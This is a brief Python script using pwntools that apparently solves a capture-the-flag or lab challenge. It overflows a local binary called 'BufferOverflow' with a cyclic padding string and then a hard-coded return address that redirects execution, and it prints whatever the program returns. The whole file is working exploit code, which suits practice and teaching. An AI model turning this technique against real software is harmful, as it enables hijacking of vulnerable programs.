from pwn import *

target = "./BufferOverflow" 
p = process(target)

payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + '\x86\x85\x04\x08'

p.sendlineafter("Input some text:", payload)

while True:
	print(p.recvline().decode("utf-8"))